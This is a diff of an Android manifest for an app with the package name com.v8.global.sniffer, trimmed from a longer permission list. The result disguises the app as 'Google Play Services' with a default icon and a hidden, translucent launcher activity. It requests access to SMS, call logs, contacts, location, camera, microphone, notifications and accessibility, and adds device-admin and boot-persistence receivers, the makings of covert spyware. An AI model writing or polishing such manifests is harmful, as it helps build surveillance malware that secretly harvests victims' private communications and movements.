@@ -2,213 +2,79 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.v8.global.sniffer">
 
-    <!-- ==================== أذونات المستوى 1: أساسية للتشغيل ==================== -->
-    <!-- الإنترنت والتخزين الأساسي -->
+    <!-- أذونات الإنترنت الأساسية -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     
-    <!-- ==================== أذونات المستوى 2: التخزين الكامل ==================== -->
-    <!-- للوصول الكامل للملفات -->
+    <!-- أذونات التخزين -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.CLEAR_APP_CACHE" />
     
-    <!-- ==================== أذونات المستوى 3: البيانات الشخصية ==================== -->
-    <!-- جهات الاتصال والحسابات -->
+    <!-- أذونات البيانات الشخصية -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.GET_ACCOUNTS" />
     
-    <!-- الرسائل القصيرة -->
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    
-    <!-- سجل المكالمات -->
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.CALL_PHONE" />
-    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
-    
-    <!-- ==================== أذونات المستوى 4: الموقع والمراقبة ==================== -->
-    <!-- الموقع بدقة عالية -->
+    <!-- أذونات الموقع -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
     
-    <!-- الأجهزة الحسية -->
-    <uses-permission android:name="android.permission.BODY_SENSORS" />
-    <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
-    
-    <!-- ==================== أذونات المستوى 5: التسجيل والصوت ==================== -->
-    <!-- الكاميرا والصوت والفيديو -->
+    <!-- أذونات الكاميرا والصوت -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     
-    <!-- ==================== أذونات المستوى 6: الإشعارات والتحكم ==================== -->
-    <!-- الإشعارات -->
-    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
+    <!-- أذونات الإشعارات -->
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
     
-    <!-- التحكم في النوافذ -->
+    <!-- أذونات النظام -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.WRITE_SETTINGS" />
-    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
-    
-    <!-- ==================== أذونات المستوى 7: الشبكات المتقدمة ==================== -->
-    <!-- الواي فاي والبلوتوث -->
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.BLUETOOTH" />
-    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
-    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
-    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
-    <uses-permission android:name="android.permission.BLUETOOTH_ADVERTISE" />
-    <uses-permission android:name="android.permission.NFC" />
-    
-    <!-- ==================== أذونات المستوى 8: إدارة النظام ==================== -->
-    <!-- تحكم كامل بالنظام -->
-    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
-    <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS" />
-    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
-    <uses-permission android:name="android.permission.READ_LOGS" />
-    <uses-permission android:name="android.permission.SET_TIME" />
-    <uses-permission android:name="android.permission.SET_TIME_ZONE" />
-    
-    <!-- ==================== أذونات المستوى 9: الأمان والمصادقة ==================== -->
-    <!-- البصمة والأمان -->
-    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
-    <uses-permission android:name="android.permission.USE_FINGERPRINT" />
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
-    
-    <!-- ==================== أذونات المستوى 10: إضافات ==================== -->
-    <!-- أذونات إضافية -->
-    <uses-permission android:name="android.permission.VIBRATE" />
-    <uses-permission android:name="android.permission.FLASHLIGHT" />
-    <uses-permission android:name="android.permission.EXPAND_STATUS_BAR" />
-    <uses-permission android:name="android.permission.SET_WALLPAPER" />
-    
-    <!-- ==================== ميزات الأجهزة المطلوبة ==================== -->
-    <!-- تحديد الأجهزة المطلوبة -->
-    <uses-feature android:name="android.hardware.camera" android:required="false" />
-    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
-    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
-    <uses-feature android:name="android.hardware.microphone" android:required="false" />
-    <uses-feature android:name="android.hardware.location" android:required="false" />
-    <uses-feature android:name="android.hardware.location.gps" android:required="false" />
-    <uses-feature android:name="android.hardware.location.network" android:required="false" />
-    <uses-feature android:name="android.hardware.wifi" android:required="false" />
-    <uses-feature android:name="android.hardware.bluetooth" android:required="false" />
-    <uses-feature android:name="android.hardware.telephony" android:required="false" />
-    <uses-feature android:name="android.hardware.sensor.compass" android:required="false" />
-    <uses-feature android:name="android.hardware.sensor.accelerometer" android:required="false" />
-    <uses-feature android:name="android.hardware.sensor.gyroscope" android:required="false" />
-    <uses-feature android:name="android.hardware.sensor.light" android:required="false" />
-    <uses-feature android:name="android.hardware.sensor.proximity" android:required="false" />
-    
-    <!-- ==================== التطبيق ==================== -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
     <application
         android:allowBackup="true"
-        android:label="Google Play Services"
-        android:theme="@style/Theme.AppCompat.Light"
-        android:usesCleartextTraffic="true"
         android:icon="@android:drawable/sym_def_app_icon"
+        android:label="Google Play Services"
         android:roundIcon="@android:drawable/sym_def_app_icon"
         android:supportsRtl="true"
-        android:allowClearUserData="true"
-        android:testOnly="false"
-        android:hasFragileUserData="true"
-        android:persistent="true"
-        android:largeHeap="true"
-        android:hardwareAccelerated="true">
+        android:theme="@style/Theme.AppCompat.Light"
+        android:usesCleartextTraffic="true">
         
-        <!-- ==================== الأنشطة ==================== -->
-        <!-- النشاط الرئيسي - مخفي -->
+        <!-- Main Activity -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:launchMode="singleInstance"
             android:excludeFromRecents="true"
             android:noHistory="true"
-            android:screenOrientation="portrait"
-            android:theme="@style/Theme.AppCompat.Translucent"
-            android:configChanges="orientation|screenSize|keyboardHidden|keyboard|navigation"
-            android:windowSoftInputMode="stateAlwaysHidden">
+            android:theme="@style/Theme.AppCompat.Translucent">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
         
-        <!-- نشاط الحصول على الأذونات -->
-        <activity
-            android:name=".PermissionActivity"
-            android:exported="false"
-            android:theme="@style/Theme.AppCompat.Translucent"
-            android:excludeFromRecents="true"
-            android:noHistory="true" />
-        
-        <!-- ==================== الخدمات ==================== -->
-        <!-- خدمة الإشعارات الرئيسية -->
+        <!-- Notification Service -->
         <service
             android:name=".NotificationService"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true"
-            android:enabled="true"
-            android:stopWithTask="false"
-            android:foregroundServiceType="dataSync|location|camera|microphone"
-            android:isolatedProcess="false">
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
         
-        <!-- خدمة التحكم الرئيسية -->
+        <!-- Accessibility Service -->
         <service
-            android:name=".ControlService"
-            android:enabled="true"
-            android:exported="false"
-            android:stopWithTask="false"
-            android:foregroundServiceType="dataSync|location|camera|microphone"
-            android:isolatedProcess="false" />
-        
-        <!-- خدمة الخلفية للتشغيل الدائم -->
-        <service
-            android:name=".BackgroundService"
-            android:enabled="true"
-            android:exported="false"
-            android:stopWithTask="false"
-            android:foregroundServiceType="dataSync" />
-        
-        <!-- خدمة إعادة التشغيل التلقائي -->
-        <service
-            android:name=".RestartService"
-            android:enabled="true"
-            android:exported="false" />
-        
-        <!-- خدمة البث المباشر -->
-        <service
-            android:name=".LiveStreamService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="camera|microphone" />
-        
-        <!-- خدمة الوصول (Accessibility) -->
-        <service
-            android:name=".V8AccessibilityService"
+            android:name=".AccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true"
-            android:enabled="true"
-            android:stopWithTask="false">
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -217,100 +83,29 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
         
-        <!-- ==================== المستقبلات ==================== -->
-        <!-- مستقبل الإقلاع -->
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="true"
-            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
-            <intent-filter android:priority="999">
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.REBOOT" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
-                <category android:name="android.intent.category.DEFAULT" />
-            </intent-filter>
-        </receiver>
-        
-        <!-- مستقبل إعادة التشغيل -->
-        <receiver
-            android:name=".RestartReceiver"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="restartservice" />
-                <action android:name="android.intent.action.PACKAGE_RESTARTED" />
-                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-                <action android:name="android.intent.action.PACKAGE_REPLACED" />
-            </intent-filter>
-        </receiver>
-        
-        <!-- مستقبل الشحن -->
-        <receiver
-            android:name=".PowerReceiver"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
-                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
-                <action android:name="android.intent.action.BATTERY_LOW" />
-                <action android:name="android.intent.action.BATTERY_OKAY" />
-            </intent-filter>
-        </receiver>
-        
-        <!-- مستقبل الوقت -->
-        <receiver
-            android:name=".TimeReceiver"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.TIME_SET" />
-                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
-                <action android:name="android.intent.action.DATE_CHANGED" />
-            </intent-filter>
-        </receiver>
-        
-        <!-- مستقبل الرسائل القصيرة -->
-        <receiver
-            android:name=".SmsReceiver"
-            android:enabled="true"
-            android:exported="true"
-            android:permission="android.permission.BROADCAST_SMS">
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-                <action android:name="android.provider.Telephony.SMS_DELIVER" />
-            </intent-filter>
-        </receiver>
-        
-        <!-- مستقبل المكالمات -->
-        <receiver
-            android:name=".CallReceiver"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter android:priority="999">
-                <action android:name="android.intent.action.PHONE_STATE" />
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-            </intent-filter>
-        </receiver>
-        
-        <!-- ==================== مستقبل مدير الجهاز ==================== -->
+        <!-- Device Admin Receiver -->
         <receiver
             android:name=".AdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
-            android:exported="true"
-            android:enabled="true">
+            android:exported="true">
             <meta-data
                 android:name="android.app.device_admin"
                 android:resource="@xml/device_admin_receiver" />
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
-                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED" />
             </intent-filter>
         </receiver>
         
-        <!-- ==================== مقدم المحتوى ==================== -->
+        <!-- Boot Receiver -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        
+        <!-- File Provider -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
